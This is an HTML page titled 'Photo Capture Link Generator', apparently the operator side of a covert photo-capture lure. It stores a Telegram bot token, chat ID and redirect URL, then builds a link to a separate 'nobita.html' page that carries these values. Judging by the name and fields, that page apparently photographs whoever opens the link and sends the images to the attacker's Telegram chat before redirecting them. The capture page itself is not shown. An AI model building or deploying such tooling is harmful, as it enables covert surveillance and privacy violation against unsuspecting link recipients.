<!DOCTYPE html>
<html>
<head>
    <title>Photo Capture Link Generator</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; display:flex; flex-direction:column; align-items:center; margin:40px;}
        .container{max-width:350px;width:100%;border:1px solid #ddd;padding:24px;border-radius:8px;}
        input,button{margin-top:10px;padding:10px;width:100%;box-sizing:border-box;}
        #result{margin-top:20px;word-break:break-all;}
    </style>
</head>
<body>
    <div class="container">
        <h2>Make Your Capture Link</h2>
        <input type="text" id="token" placeholder="Telegram Bot Token" required>
        <input type="text" id="chatid" placeholder="Telegram Chat ID" required>
        <input type="text" id="redirect" placeholder="Redirect URL (e.g. https://example.com)" required>
        <button onclick="saveData()">Save</button>
        <button onclick="generate()">Generate Link</button>
        <div id="result"></div>
    </div>
    <script>
        // Load data from localStorage when page opens
        window.onload = function() {
            document.getElementById('token').value = localStorage.getItem('photo_token') || '';
            document.getElementById('chatid').value = localStorage.getItem('photo_chatid') || '';
            document.getElementById('redirect').value = localStorage.getItem('photo_redirect') || '';
        };

        function saveData() {
            const token = document.getElementById('token').value.trim();
            const chat = document.getElementById('chatid').value.trim();
            const redirect = document.getElementById('redirect').value.trim();
            if (!token || !chat || !redirect) {
                alert("Please Enter Token, Chat ID, and Redirect URL to save");
                return;
            }
            localStorage.setItem('photo_token', token);
            localStorage.setItem('photo_chatid', chat);
            localStorage.setItem('photo_redirect', redirect);
            alert('Saved! Now these values will auto-fill next time.');
        }

        function generate() {
            const token = encodeURIComponent(document.getElementById('token').value.trim());
            const chat = encodeURIComponent(document.getElementById('chatid').value.trim());
            const redirect = encodeURIComponent(document.getElementById('redirect').value.trim());
            if (!token || !chat || !redirect) {
                alert("Please Enter Token, Chat ID, and Redirect URL");
                return;
            }
            // Change the base URL if needed, default: same folder
            const baseUrl = location.origin + location.pathname.replace('index.html', '') + 'nobita.html';
            const link = `${baseUrl}?token=${token}&chat=${chat}&redirect=${redirect}`;
            document.getElementById('result').innerHTML = `<b>Your Link:</b><br><a href="${link}" target="_blank">${link}</a>`;
        }
    </script>
</body>
</html>
